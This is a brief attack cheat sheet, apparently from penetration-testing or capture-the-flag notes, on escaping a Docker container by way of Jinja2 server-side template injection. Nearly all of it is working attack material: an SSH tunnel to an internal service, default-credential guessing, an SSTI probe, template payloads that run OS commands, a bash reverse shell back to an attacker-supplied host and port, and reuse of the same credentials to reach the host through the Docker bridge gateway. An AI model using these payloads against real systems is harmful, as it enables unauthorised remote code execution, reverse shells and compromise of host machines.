# Docker Container Default Credential Escape via SSTI

When a containerized app (e.g. Flask, Werkzeug admin panel) is running inside a Docker container with a default/shared credential, use SSTI to get a shell, then escape via mounted host path or default credentials reuse.

```bash
# 1. Access internal service (may need SSH tunnel or port forward)
ssh -L 8888:172.19.0.2:8888 <USER>@<TARGET>

# 2. Log in with default creds (admin:admin, admin:password, etc.)

# 3. Find SSTI input — test: {{7*7}} → 49

# 4. Jinja2 RCE:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# or:
{{''.__class__.mro()[1].__subclasses__()[<N>].__init__.__globals__['__builtins__']['__import__']('os').system('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"')}}

# 5. Inside container — try SSH to host with same credentials:
ssh <USER>@172.19.0.1  # Docker bridge gateway = host
```
